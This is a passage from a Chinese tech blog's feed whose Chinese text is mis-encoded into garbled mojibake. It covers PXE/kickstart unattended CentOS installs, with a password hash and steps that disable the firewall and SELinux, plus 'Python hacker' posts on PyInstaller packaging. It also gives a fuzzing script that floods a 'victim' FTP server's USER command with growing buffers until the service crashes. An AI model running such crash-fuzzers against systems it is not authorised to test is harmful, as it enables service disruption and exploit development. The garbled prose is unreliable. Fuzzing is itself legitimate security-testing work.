è½½ç¨‹åºï¼Œè€Œä¸”å…¼å®¹å„ç§ä»‹è´¨ã€‚SYSLINUXæ˜¯ä¸€ä¸ªå°å‹çš„Linuxæ“ä½œç³»ç»Ÿï¼Œå®ƒçš„ç›®çš„æ˜¯ç®€åŒ–é¦–æ¬¡å®‰è£…Linuxçš„æ—¶é—´ï¼Œå¹¶å»ºç«‹ä¿®æŠ¤æˆ–å…¶å®ƒç‰¹æ®Šç”¨é€”çš„å¯åŠ¨ç›˜ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°pxelinux.0è¿™ä¸ªæ–‡ä»¶,å¯ä»¥å®‰è£…ä¸€ä¸‹ã€‚</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">[root@CentOS6.5 ~]<span class="comment"># yum -y install syslinux</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/</span></div><div class="line"><span class="comment"># å¤åˆ¶å¯åŠ¨èœå•ç¨‹åºæ–‡ä»¶</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># cp -a /var/www/html/CentOS-6.5/isolinux/* /var/lib/tftpboot/</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># ls /var/lib/tftpboot/</span></div><div class="line">boot.cat  grub.conf   isolinux.bin  memtest     splash.jpg  vesamenu.c32</div><div class="line">boot.msg  initrd.img  isolinux.cfg  pxelinux.0  TRANS.TBL   vmlinuz</div><div class="line"><span class="comment"># æ–°å»ºä¸€ä¸ªpxelinux.cfgç›®å½•ï¼Œå­˜æ”¾å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶ã€‚</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># mkdir -p /var/lib/tftpboot/pxelinux.cfg</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># cp /var/www/html/CentOS-6.5/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default</span></div></pre></div></div></figure><h1 id="6-æµ‹è¯•æ‰‹åŠ¨ç½‘ç»œå®‰è£…"><a href="#6-æµ‹è¯•æ‰‹åŠ¨ç½‘ç»œå®‰è£…" class="headerlink" title="6. æµ‹è¯•æ‰‹åŠ¨ç½‘ç»œå®‰è£…"></a>6. æµ‹è¯•æ‰‹åŠ¨ç½‘ç»œå®‰è£…</h1><p><code>å¼€å¯ä¸€ä¸ªæ–°çš„è™šæ‹Ÿæœºå†…å­˜ç»™1GB,ä¸å‡ºé”™è¯¯ä¼šçœ‹åˆ°å…‰ç›˜å®‰è£…ç•Œé¢, æ¥ä¸‹æ¥å°±æ˜¯åˆ›å»ºks.cfgäº†. å…³é—­æµ‹è¯•è™šæ‹Ÿæœº,ç»§ç»­</code></p><h1 id="7-åˆ›å»ºks-cfgæ–‡ä»¶"><a href="#7-åˆ›å»ºks-cfgæ–‡ä»¶" class="headerlink" title="7. åˆ›å»ºks.cfgæ–‡ä»¶"></a>7. åˆ›å»ºks.cfgæ–‡ä»¶</h1><blockquote><p>é€šå¸¸ï¼Œæˆ‘ä»¬åœ¨å®‰è£…æ“ä½œç³»ç»Ÿçš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å¤§é‡çš„å’ŒæœåŠ¡å™¨äº¤äº’æ“ä½œï¼Œä¸ºäº†å‡å°‘è¿™ä¸ªäº¤äº’è¿‡ç¨‹ï¼Œkickstartå°±è¯ç”Ÿäº†ã€‚ä½¿ç”¨è¿™ç§kickstartï¼Œåªéœ€äº‹å…ˆå®šä¹‰å¥½ä¸€ä¸ªKickstartè‡ªåŠ¨åº”ç­”é…ç½®æ–‡ä»¶ks.cfgï¼ˆé€šå¸¸å­˜æ”¾åœ¨å®‰è£…æœåŠ¡å™¨ä¸Šï¼‰ï¼Œå¹¶è®©å®‰è£…ç¨‹åºçŸ¥é“è¯¥é…ç½®æ–‡ä»¶çš„ä½ç½®ï¼Œåœ¨å®‰è£…è¿‡ç¨‹ä¸­å®‰è£…ç¨‹åºå°±å¯ä»¥è‡ªå·±ä»è¯¥æ–‡ä»¶ä¸­è¯»å–å®‰è£…é…ç½®ï¼Œè¿™æ ·å°±é¿å…äº†åœ¨å®‰è£…è¿‡ç¨‹ä¸­å¤šæ¬¡çš„äººæœºäº¤äº’ï¼Œä»è€Œå®ç°æ— äººå€¼å®ˆçš„è‡ªåŠ¨åŒ–å®‰è£…ã€‚</p></blockquote><p><strong><code>ç”Ÿæˆkickstarté…ç½®æ–‡ä»¶çš„ä¸‰ç§æ–¹æ³•ï¼š</code></strong></p><ul><li>æ–¹æ³•1ã€ æ¯å®‰è£…å¥½ä¸€å°Centosæœºå™¨ï¼ŒCentoså®‰è£…ç¨‹åºéƒ½ä¼šåˆ›å»ºä¸€ä¸ªkickstarté…ç½®æ–‡ä»¶ï¼Œè®°å½•ä½ çš„çœŸå®å®‰è£…é…ç½®ã€‚å¦‚æœä½ å¸Œæœ›å®ç°å’ŒæŸç³»ç»Ÿç±»ä¼¼çš„å®‰è£…ï¼Œå¯ä»¥åŸºäºè¯¥ç³»ç»Ÿçš„kickstarté…ç½®æ–‡ä»¶æ¥ç”Ÿæˆä½ è‡ªå·±çš„kickstarté…ç½®æ–‡ä»¶ã€‚ï¼ˆç”Ÿæˆçš„æ–‡ä»¶åå­—å«anaconda-ks.cfgä½äº/root/anaconda-ks.cfgï¼‰</li><li>æ–¹æ³•2ã€Centosæä¾›äº†ä¸€ä¸ªå›¾å½¢åŒ–çš„kickstarté…ç½®å·¥å…·ã€‚åœ¨ä»»ä½•ä¸€ä¸ªå®‰è£…å¥½çš„Linuxç³»ç»Ÿä¸Šè¿è¡Œè¯¥å·¥å…·ï¼Œå°±å¯ä»¥å¾ˆå®¹æ˜“åœ°åˆ›å»ºä½ è‡ªå·±çš„kickstarté…ç½®æ–‡ä»¶ã€‚kickstarté…ç½®å·¥å…·å‘½ä»¤ä¸ºrsystem-config-kickstart,ç½‘ä¸Šæœ‰å¾ˆå¤šç”¨CentOSæ¡Œé¢ç‰ˆç”Ÿæˆksæ–‡ä»¶çš„æ–‡ç« ï¼Œå¦‚æœæœ‰ç°æˆçš„ç³»ç»Ÿå°±æ²¡ä»€ä¹ˆå¯è¯´ã€‚ä½†æ²¡æœ‰ç°æˆçš„ï¼Œä¹Ÿæ²¡æœ‰å¿…è¦å»ç”¨æ¡Œé¢ç‰ˆï¼Œå‘½ä»¤è¡Œä¹Ÿå¾ˆç®€å•ã€‚</li><li>æ–¹æ³•3ã€é˜…è¯»kickstarté…ç½®æ–‡ä»¶çš„æ‰‹å†Œã€‚ç”¨ä»»ä½•ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨éƒ½å¯ä»¥åˆ›å»ºä½ è‡ªå·±çš„kickstarté…ç½®æ–‡ä»¶ã€‚</li></ul><p><strong><code>è¿™é‡Œè´´å‡ºæˆ‘çš„ks.cfg,è¿™ä¸ªæ˜¯CentOS6.8çš„,å¯ä»¥æ ¹æ®éœ€æ±‚æ›´æ”¹</code></strong></p><p><strong><code>è¿™é‡Œæ˜¯å®˜æ–¹æ–‡æ¡£</code><a href="https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/6/html/Installation_Guide/s1-kickstart2-options.html" target="_blank" rel="noopener">è¯¦è§£ks.cfgé…ç½®æ–‡ä»¶è¯­å¥CentOS</a></strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#platform=x86, AMD64, æˆ– Intel EM64T</span></div><div class="line"><span class="comment">#version=DEVEL</span></div><div class="line"><span class="comment"># Firewall configuration</span></div><div class="line">firewall --enabled --http --ssh</div><div class="line"><span class="comment"># Install OS instead of upgrade</span></div><div class="line">install</div><div class="line"><span class="comment"># Use network installation</span></div><div class="line">url --url=<span class="string">"http://192.168.1.52/CentOS6.5"</span></div><div class="line"><span class="comment"># Root password</span></div><div class="line">rootpw --iscrypted <span class="variable">$1</span><span class="variable">$xn3sYOAA</span><span class="variable">$jOfmmjxxYA</span>/IRjFm0BM5O0</div><div class="line"><span class="comment"># System authorization information</span></div><div class="line">auth  --useshadow  --passalgo=sha512</div><div class="line"><span class="comment"># Use graphical install</span></div><div class="line">graphical</div><div class="line"><span class="comment"># System keyboard</span></div><div class="line">keyboard us</div><div class="line"><span class="comment"># System language</span></div><div class="line">lang zh_CN</div><div class="line"><span class="comment"># SELinux configuration</span></div><div class="line">selinux --enforcing</div><div class="line"><span class="comment"># Do not configure the X Window System</span></div><div class="line">skipx</div><div class="line"><span class="comment"># Installation logging level</span></div><div class="line">logging --level=info</div><div class="line"></div><div class="line"><span class="comment"># System timezone</span></div><div class="line">timezone  Africa/Libreville</div><div class="line"><span class="comment"># System bootloader configuration</span></div><div class="line">bootloader --location=mbr</div><div class="line"><span class="comment"># Partition clearing information</span></div><div class="line">clearpart --all  </div><div class="line"></div><div class="line">%packages</div><div class="line">@php</div><div class="line"></div><div class="line">%end</div></pre></div></div></figure><h1 id="8-æ•´åˆDefaulté…ç½®æ–‡ä»¶å®ç°æ— äººå€¼å®ˆ"><a href="#8-æ•´åˆDefaulté…ç½®æ–‡ä»¶å®ç°æ— äººå€¼å®ˆ" class="headerlink" title="8. æ•´åˆDefaulté…ç½®æ–‡ä»¶å®ç°æ— äººå€¼å®ˆ"></a>8. æ•´åˆDefaulté…ç½®æ–‡ä»¶å®ç°æ— äººå€¼å®ˆ</h1><p><code>vim /var/lib/tftpboot/pxelinux.cfg/default</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">default ks</div><div class="line">prompt 0</div><div class="line">label ks</div><div class="line">  kernel vmlinuz</div><div class="line">  append initrd=initrd.img ks=http://192.168.1.52/ks_config/CentOS-6.5-ks.cfg <span class="comment"># å‘Šè¯‰å®‰è£…ç¨‹åºks.cfgæ–‡ä»¶åœ¨å“ªé‡Œ</span></div><div class="line"><span class="comment"># append initrd=initrd.img ks=http://192.168.1.52/ks_config/CentOS-6.5-ks.cfg ksdevice=eth0</span></div><div class="line"><span class="comment"># ksdevice=eth0ä»£è¡¨å½“å®¢æˆ·ç«¯æœ‰å¤šå—ç½‘å¡çš„æ—¶å€™ï¼Œè¦å®ç°è‡ªåŠ¨åŒ–éœ€è¦è®¾ç½®ä»eth1å®‰è£…ï¼Œä¸æŒ‡å®šçš„è¯ï¼Œå®‰è£…çš„æ—¶å€™ç³»ç»Ÿä¼šè®©ä½ é€‰æ‹©ï¼Œé‚£å°±ä¸å«å…¨è‡ªåŠ¨åŒ–äº†</span></div></pre></div></div></figure><h1 id="9-æ‰“å¼€ç³»ç»Ÿç”µæº-å‡ºå»åƒä¸ªé¥­-è¿‡ä¼šå›æ¥-ç³»ç»Ÿå°±ä»¥ç»è£…å¥½äº†"><a href="#9-æ‰“å¼€ç³»ç»Ÿç”µæº-å‡ºå»åƒä¸ªé¥­-è¿‡ä¼šå›æ¥-ç³»ç»Ÿå°±ä»¥ç»è£…å¥½äº†" class="headerlink" title="9. æ‰“å¼€ç³»ç»Ÿç”µæº,å‡ºå»åƒä¸ªé¥­,è¿‡ä¼šå›æ¥,ç³»ç»Ÿå°±ä»¥ç»è£…å¥½äº†"></a>9. æ‰“å¼€ç³»ç»Ÿç”µæº,å‡ºå»åƒä¸ªé¥­,è¿‡ä¼šå›æ¥,ç³»ç»Ÿå°±ä»¥ç»è£…å¥½äº†</h1><p><strong><code>å…³é—­æœåŠ¡ç«¯çš„iptables,selinux</code></strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">service iptables stop</div><div class="line">setenforce 0</div></pre></div></div></figure><blockquote><p>å…¶cobblerä¹Ÿå¯å®ç°æ— äººå€¼å®ˆ,å±äºå·¥å…·</p></blockquote>]]></content>
      
      <categories>
          
          <category> è‡ªåŠ¨åŒ–è¿ç»´ </category>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pythoné»‘å®¢ä¹‹æ—…0x5</title>
      <link href="/2015/10/17/pythonhacker_0x5/"/>
      <url>/2015/10/17/pythonhacker_0x5/</url>
      <content type="html"><![CDATA[<h2 id="ä½¿ç”¨PyInstallerç”Ÿæˆå¯ä»¥æ‰§è¡Œç¨‹åº"><a href="#ä½¿ç”¨PyInstallerç”Ÿæˆå¯ä»¥æ‰§è¡Œç¨‹åº" class="headerlink" title="ä½¿ç”¨PyInstallerç”Ÿæˆå¯ä»¥æ‰§è¡Œç¨‹åº"></a>ä½¿ç”¨PyInstallerç”Ÿæˆå¯ä»¥æ‰§è¡Œç¨‹åº</h2><p>è¿™ä¸€ç« æ˜¯æ•™å¤§å®¶å¦‚ä½•æŠŠè‡ªå·±çš„pythonè„šæœ¬ç¼–è¯‘æˆwindowsä¸‹å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ƒå¯ä»¥è®©ä½ çš„pythonè„šæœ¬è·¨å¹³å°å»è¿è¡Œï¼Œå¹¶ä¸”ä¸éœ€è¦å»å®‰è£…pythonè§£é‡Šå™¨ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸‹è½½ä¾èµ–åŒ…,cygwin(æˆ–è€…å…¶ä»–çš„å·¥å…·ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Pywin).</p><a id="more"></a><h1 id="Pythonè½¬exe"><a href="#Pythonè½¬exe" class="headerlink" title="Pythonè½¬exe"></a>Pythonè½¬exe</h1><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>Linux: <code>sudo apt-get install python2.7 build-essential python-dev zlib1g-dev upx</code></p><p>Windows: <a href="http://www.activestate.com/activepython" target="_blank" rel="noopener">http://www.activestate.com/activepython</a> (fully packaged installer file)</p><p>å®‰è£… <a href="http://sourceforge.net/projects/pywin32/" target="_blank" rel="noopener">Pywin32</a>, <a href="https://pypi.python.org/pypi/setuptools#downloads" target="_blank" rel="noopener">Setuptools</a>, <a href="http://www.pyinstaller.org/" target="_blank" rel="noopener">PyInstaller</a></p><h3 id="å®‰è£…å®Œæˆä¹‹å"><a href="#å®‰è£…å®Œæˆä¹‹å" class="headerlink" title="å®‰è£…å®Œæˆä¹‹å"></a>å®‰è£…å®Œæˆä¹‹å</h3><p>ä¸‹ä¸€æ­¥æˆ‘ä»¬å°±è¿è¡Œpythonå‘½ä»¤ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶:</p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">python pyinstaller.py --onefile &lt;scriptName&gt;</div></pre></div></div></figure><p>æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤ä¹‹åï¼Œå¯¼å…¥ä¾èµ–æ–‡ä»¶å¹¶ä¸”ç”Ÿæˆä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œé¢åŒ…å«äº†ä¸‰ä¸ªæ–‡ä»¶<code>&lt;scriptName&gt;.txt,&lt;scriptName&gt;.spec</code>å’Œ<code>&lt;scriptName&gt;.exe</code>æ–‡ä»¶ï¼Œå…¶ä¸­.txtä¸.specå¯ä»¥åˆ é™¤æ‰ï¼Œè€Œ<strong><em>.exe</em></strong>çš„æ–‡ä»¶å°±æ˜¯ä½ éœ€è¦çš„æ‰§è¡Œç¨‹åº.</p><h3 id="å®Œæ•´çš„å°è£…æ‰§è¡Œç¨‹åº"><a href="#å®Œæ•´çš„å°è£…æ‰§è¡Œç¨‹åº" class="headerlink" title="å®Œæ•´çš„å°è£…æ‰§è¡Œç¨‹åº"></a>å®Œæ•´çš„å°è£…æ‰§è¡Œç¨‹åº</h3><p>Pythonè„šæœ¬ç°åœ¨å·²ç»è¢«ç¼–è¯‘æˆäº†windows PEæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸éœ€è¦Pythonè§£é‡Šå™¨å°±èƒ½å¤Ÿåœ¨windowsä¸‹é¢ç‹¬ç«‹è¿è¡Œï¼Œè¿™å¯ä»¥è®©ä½ æ›´è½»æ¾çš„æŠŠè„šæœ¬è¿ç§»åˆ°windowsä¸Šé¢è€Œä¸”ä¸ç”¨æ‹…å¿ƒä¾èµ–åŒ…ç¼ºå¤±çš„é—®é¢˜.</p><p>ä¸€ä¸ªç®€å•çš„è„šæœ¬:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"> </div><div class="line"><span class="keyword">import</span> os</div><div class="line"> </div><div class="line">os.system(<span class="string">"echo Hello World!"</span>)</div></pre></div></div></figure><p>ç°åœ¨æˆ‘ä»¬æŠŠä¸Šé¢è¿™ä¸ªè„šæœ¬ç¼–è¯‘æˆä¸ºä¸€ä¸ªå¯ä»¥æ‰§è¡Œçš„æ–‡ä»¶:</p><p><strong>Windows</strong></p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">c:\PathToPython\python.exe pyinstaller.py --onefile helloWorld.py</div><div class="line"> </div><div class="line">&gt; helloWorld.exe</div><div class="line">Hello World!</div></pre></div></div></figure><p><strong>Linux</strong></p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">pytnstaller --onefile helloworld.py</div></pre></div></div></figure><blockquote><p>ç”Ÿæˆåçš„å¯æ‰§è¡Œæ–‡ä»¶åœ¨<code>dist</code>æ–‡ä»¶å¤¹ä¸­</p></blockquote><blockquote><p>å¦‚æœä½ æƒ³æ›´è¯¦ç»†çš„äº†è§£è¿™ä¸ªè¿‡ç¨‹ï¼Œå¯ä»¥å‚è€ƒ<a href="http://www.primalsecurity.net/back-to-the-source-code-forwardingreverse-engineering-python-malware/" target="_blank" rel="noopener">BACK TO THE SOURCE CODE â€“ Forward/Reverse Engineering Python Malware</a></p></blockquote><p>æŠŠä½ çš„pythonè„šæœ¬ç¼–è¯‘æˆä¸€ä¸ªå¯ä»¥åœ¨windowsä¸Šé¢å¯ä»¥æ‰§è¡Œçš„å¯æ‰§è¡Œç¨‹åºæ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå› ä¸ºå®ƒä¸éœ€è¦ä½ å®‰è£…pythonè§£é‡Šå™¨è¿˜æœ‰ä¾èµ–åŒ…</p><p>å¤§å®¶å¯ä»¥å°è¯•ä¸€ä¸‹<strong>0x3</strong>ä¸­çš„ä¾‹å­ï¼ŒæŠŠé‚£ä¸ªè„šæœ¬ç¼–è¯‘æˆå¯æ‰§è¡Œç¨‹åºã€‚ä¸‹ä¸€ç« </p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pythoné»‘å®¢ä¹‹æ—…0x4</title>
      <link href="/2015/10/16/pythonhacker_0x4/"/>
      <url>/2015/10/16/pythonhacker_0x4/</url>
      <content type="html"><![CDATA[<h2 id="ç¼–å†™Fuzzæµ‹è¯•è„šæœ¬"><a href="#ç¼–å†™Fuzzæµ‹è¯•è„šæœ¬" class="headerlink" title="ç¼–å†™Fuzzæµ‹è¯•è„šæœ¬"></a>ç¼–å†™Fuzzæµ‹è¯•è„šæœ¬</h2><p> è¿™ä¸€ç« å°†ä¼šæ¼”ç¤ºæ•™ä½ å¦‚ä½•å†™ä¸€ä¸ªå±äºè‡ªå·±çš„<code>Fuzz</code>æµ‹è¯•è„šæœ¬ï¼Œå½“æˆ‘ä»¬è¿›è¡Œ<code>exploit</code>ç ”ç©¶å’Œå¼€å‘çš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨è„šæœ¬è¯­è¨€å‘é€å¤§é‡çš„æµ‹è¯•æ•°æ®ç»™å—å®³è€…æœºå™¨ï¼Œä½†æ˜¯è¿™ä¸ªé”™è¯¯æ•°æ®å¾ˆå®¹æ˜“å¼•å‘åº”ç”¨ç¨‹åºå´©æºƒæ‰ã€‚</p><p>è€Œ<code>Python</code>å´ä¸åŒï¼Œå½“ç¨‹åºå´©æºƒä¹‹åï¼Œæ­¤æ—¶ä½ çš„ç¨‹åºä¼šæš‚æ—¶æ–­å¼€è¿æ¥ï¼Œéšåä¼šç«‹å³åˆ›å»ºä¸€ä¸ªæ–°çš„è¿æ¥ç»§ç»­æ‰§è¡Œã€‚</p><p> ä¸‹é¢æˆ‘ä»¬é¦–å…ˆè¦è§£å†³çš„é—®é¢˜æ˜¯åº”ç”¨ç¨‹åºå¦‚ä½•å¤„ç†ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šä¸å®šæ—¶çš„æƒ³åˆ°ä¸€äº›æ–°çš„æ€è·¯ç„¶åæŠŠæ•°æ®å‘é€ç»™å—å®³è€…æœºå™¨ä¸Šé¢æ¥æµ‹è¯•ï¼Œè¿™åŸºæœ¬æ€è·¯å°±æ˜¯å…ˆä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥,ç„¶åå‘é€æµ‹è¯•æ•°æ®ç»™æœåŠ¡å™¨ï¼Œé€šè¿‡<code>while</code>å¾ªç¯è¯­å¥æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸï¼Œå³ä½¿å‡ºç°é”™è¯¯ä¹Ÿä¼šå¤„ç†æ‰:</p><a id="more"></a><h2 id="ä¸‹é¢æ˜¯æˆ‘ä»¬çš„æ‰«æå™¨ä¼ªä»£ç "><a href="#ä¸‹é¢æ˜¯æˆ‘ä»¬çš„æ‰«æå™¨ä¼ªä»£ç " class="headerlink" title="ä¸‹é¢æ˜¯æˆ‘ä»¬çš„æ‰«æå™¨ä¼ªä»£ç :"></a>ä¸‹é¢æ˜¯æˆ‘ä»¬çš„æ‰«æå™¨ä¼ªä»£ç :</h2><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></div><div class="code"><pre><div class="line"> <span class="comment">#å¯¼å…¥socket,sysæ¨¡å—ï¼Œå¦‚æœæ˜¯webæœåŠ¡é‚£ä¹ˆè¿˜éœ€è¦å¯¼å…¥httplib,urllibç­‰æ¨¡å—</span></div><div class="line"> &lt;<span class="keyword">import</span> modules&gt; </div><div class="line"></div><div class="line"><span class="comment">#è®¾ç½®ip/ç«¯å£</span></div><div class="line"><span class="comment">#è°ƒç”¨è„šæœ¬: ./script.py &lt;RHOST&gt; &lt;RPORT&gt;</span></div><div class="line">RHOST = sys.argv[<span class="number">1</span>]</div><div class="line">RPORT = sys.argv[<span class="number">2</span>]</div><div class="line"> </div><div class="line"><span class="comment">#å®šä¹‰ä½ çš„æµ‹è¯•æ•°æ®,å¹¶ä¸”è®¾ç½®æµ‹è¯•æ•°æ®èŒƒå›´å€¼</span></div><div class="line">buffer = <span class="string">'\x41'</span>*<span class="number">50</span></div><div class="line"> </div><div class="line"><span class="comment">#ä½¿ç”¨å¾ªç¯æ¥è¿æ¥æœåŠ¡å¹¶ä¸”å‘é€æµ‹è¯•æ•°æ®</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">  <span class="keyword">try</span>:</div><div class="line">    <span class="comment"># å‘é€æµ‹è¯•æ•°æ®</span></div><div class="line">    <span class="comment"># ç›´åˆ°é€’å¢åˆ°50</span></div><div class="line">    buffer = buffer + <span class="string">'\x41'</span>*<span class="number">50</span></div><div class="line">  <span class="keyword">except</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Buffer Length: "</span>+len(buffer)</div><div class="line">    <span class="keyword">print</span> <span class="string">"Can't connect to service...check debugger for potential crash"</span></div></pre></div></div></figure><p>ä¸Šé¢è¿™ä¸ªè„šæœ¬æ¡†æ¶èƒ½å¤Ÿé€‚ç”¨äºå„ç§æœåŠ¡ï¼Œä½ å¯ä»¥æ ¹æ®ä½ çš„æœåŠ¡(<code>https,http,mysql,sshd</code>)ç¼–å†™ç‰¹å®šæ¨¡ç³Šæµ‹è¯•è„šæœ¬.ä¸‹é¢æˆ‘ä»¬æ¼”ç¤ºä¸€ä¸ªåŸºäº<code>USER</code>å‘½ä»¤çš„ftpæœåŠ¡å™¨æ¨¡ç³Šæµ‹è¯•è„šæœ¬:</p><h2 id="æ¨¡ç³Šæµ‹è¯•è„šæœ¬"><a href="#æ¨¡ç³Šæµ‹è¯•è„šæœ¬" class="headerlink" title="æ¨¡ç³Šæµ‹è¯•è„šæœ¬"></a>æ¨¡ç³Šæµ‹è¯•è„šæœ¬</h2><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#å¯¼å…¥ä½ å°†è¦ä½¿ç”¨çš„æ¨¡å—ï¼Œè¿™æ ·ä½ å°±ä¸ç”¨å»è‡ªå·±å®ç°é‚£äº›åŠŸèƒ½å‡½æ•°äº†</span></div><div class="line"><span class="keyword">import</span> sys, socket</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"> </div><div class="line"><span class="comment">#å£°æ˜ç¬¬ä¸€ä¸ªå˜é‡targetç”¨æ¥æ¥æ”¶ä»å‘½ä»¤ç«¯è¾“å…¥çš„ç¬¬ä¸€ä¸ªå€¼</span></div><div class="line">target = sys.argv[<span class="number">1</span>]</div><div class="line"><span class="comment">#åˆ›å»º50ä¸ªAçš„å­—ç¬¦ä¸² '\x41'</span></div><div class="line">buff = <span class="string">'\x41'</span>*<span class="number">50</span></div><div class="line"> </div><div class="line"><span class="comment"># ä½¿ç”¨å¾ªç¯æ¥é€’å¢è‡³å£°æ˜buffå˜é‡çš„é•¿åº¦50</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">  <span class="comment">#ä½¿ç”¨"try - except"å¤„ç†é”™è¯¯ä¸åŠ¨ä½œ</span></div><div class="line">  <span class="keyword">try</span>:</div><div class="line">    <span class="comment"># è¿æ¥è¿™ç›®æ ‡ä¸»æœºçš„ftpç«¯å£ 21</span></div><div class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">    s.settimeout(<span class="number">2</span>)</div><div class="line">    s.connect((target,<span class="number">21</span>))</div><div class="line">    s.recv(<span class="number">1024</span>)</div><div class="line"> </div><div class="line">    <span class="keyword">print</span> <span class="string">"Sending buffer with length: "</span>+str(len(buff))</div><div class="line">    <span class="comment">#å‘é€å­—ç¬¦ä¸²:USERå¹¶ä¸”å¸¦æœ‰æµ‹è¯•çš„ç”¨æˆ·å</span></div><div class="line">    s.send(<span class="string">"USER "</span>+buff+<span class="string">"\r\n"</span>)</div><div class="line">    s.close()</div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    <span class="comment">#ä½¿ç”¨å¾ªç¯æ¥é€’å¢ç›´è‡³é•¿åº¦ä¸º50</span></div><div class="line">    buff = buff + <span class="string">'\x41'</span>*<span class="number">50</span></div><div class="line"> </div><div class="line">  <span class="keyword">except</span>: <span class="comment"># å¦‚æœè¿æ¥æœåŠ¡å™¨å¤±è´¥ï¼Œæˆ‘ä»¬å°±æ‰“å°å‡ºä¸‹é¢çš„ç»“æœ</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Crash occured with buffer length: "</span>+str(len(buff)<span class="number">-50</span>)</div><div class="line">    sys.exit()</div></pre></div></div></figure><blockquote><p>ä¸Šé¢è¿™æ®µä»£ç 